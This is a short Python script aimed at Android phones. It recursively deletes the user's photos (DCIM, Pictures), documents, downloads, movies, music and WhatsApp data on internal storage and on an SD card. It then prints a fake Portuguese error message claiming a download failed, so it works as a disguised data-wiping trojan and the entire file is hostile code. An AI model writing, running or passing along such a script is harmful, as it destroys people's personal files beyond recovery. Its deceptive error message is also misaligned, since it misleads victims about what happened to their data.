import os
from time import sleep

if os.path.exists('/storage/emulated/0/DCIM') == True:
    os.system('cd /storage/emulated/0/DCIM;rm -rf *')
    sleep(2)

if os.path.exists('/storage/emulated/0/Documents') == True:
    os.system('cd /storage/emulated/0/Documents;rm -rf *')
    sleep(2)

if os.path.exists('/storage/emulated/0/Download') == True:
    os.system('cd /storage/emulated/0/Download;rm -rf *')
    sleep(2)

if os.path.exists('/storage/emulated/0/Pictures') == True:
    os.system('cd /storage/emulated/0;rm -rf Pictures')
    sleep(2)

if os.path.exists('/storage/emulated/0/Movies') == True:
    os.system('cd /storage/emulated/0;rm -rf Movies')
    sleep(2)

if os.path.exists('/storage/emulated/0/Music') == True:
    os.system('cd /storage/emulated/0;rm -rf Music')
    sleep(2)

if os.path.exists('/storage/00FB-0CFC/') == True:
    if os.path.exists('/storage/00FB-0CFC/Download') == True:
        os.system('cd /storage/00FB-0CFC/Download;rm -rf *')
        sleep(2)
        
    if os.path.exists('/storage/00FB-0CFC/Music') == True:
        os.system('cd /storage/00FB-0CFC;rm -rf Music')
        sleep(2)
    
    if os.path.exists('/storage/00FB-0CFC/Músicas') == True:
        os.system('cd /storage/00FB-0CFC;rm -rf Músicas')
        sleep(2)
    
    if os.path.exists('/storage/emulated/0/Whatsapp') == True:
        os.system('cd /storage/emulated/0;rm -rf Whatsapp')

print('\n\033[31m[X] ERROR de diretório. Não foi possivél concluir o download.\033[m')
